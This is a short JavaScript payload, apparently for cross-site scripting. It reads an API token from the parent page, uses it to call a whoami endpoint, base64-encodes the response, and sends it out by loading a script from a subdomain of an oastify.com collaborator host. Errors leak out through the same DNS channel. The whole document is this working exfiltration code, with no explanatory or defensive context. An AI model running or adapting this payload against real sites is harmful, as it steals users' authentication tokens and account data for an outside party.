(async () => {
  try {
    const token = window.parent.document.querySelector('#gq-api-token')?.content;
    if (!token) throw new Error('Token not found');

    const res = await fetch('/api/v1/whoami', {
      method: 'GET',
      headers: { 'Authorization': token, 'Accept': '*/*' }
    });

    const json = await res.json();
    const data = JSON.stringify(json).slice(0, 100); // Keep short for DNS
    const sub = btoa(data).replace(/[^a-zA-Z0-9]/g, '').slice(0, 50);

    const s = document.createElement('script');
    s.src = `https://${sub}.637wc77pz6vrqi1pkykpmpmldcj67wvl.oastify.com/x.js`;
    document.body.appendChild(s);
  } catch (e) {
    const err = btoa(e.message).replace(/[^a-zA-Z0-9]/g, '').slice(0, 40);
    const s = document.createElement('script');
    s.src = `https://err-${err}.637wc77pz6vrqi1pkykpmpmldcj67wvl.oastify.com/e.js`;
    document.body.appendChild(s);
  }
})();
